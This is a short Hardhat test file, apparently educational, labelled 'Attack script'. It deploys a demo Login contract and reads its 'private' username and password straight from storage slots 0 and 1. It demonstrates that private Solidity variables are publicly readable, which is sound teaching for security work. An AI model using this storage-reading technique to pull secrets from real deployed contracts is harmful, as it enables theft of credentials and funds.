const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Attack script", async function() {
    it("Reads value from private variable", async function() {
        const loginFactory = await ethers.getContractFactory("Login")
        // To save space, we would convert the string to bytes32 array
        const usernameBytes = ethers.utils.formatBytes32String("purif");
        const passwordBytes = ethers.utils.formatBytes32String("thisisnotapassword");
        const login = await loginFactory.deploy(usernameBytes,passwordBytes)
        await login.deployed()

        const slot0Bytes = await ethers.provider.getStorageAt(
            login.address,
            0
        );
        const slot1Bytes = await ethers.provider.getStorageAt(
            login.address,
            1
        );
        
        // We are able to extract the values of the private variables
        expect(ethers.utils.parseBytes32String(slot0Bytes)).to.equal("purif");
        expect(ethers.utils.parseBytes32String(slot1Bytes)).to.equal("thisisnotapassword");
    })
})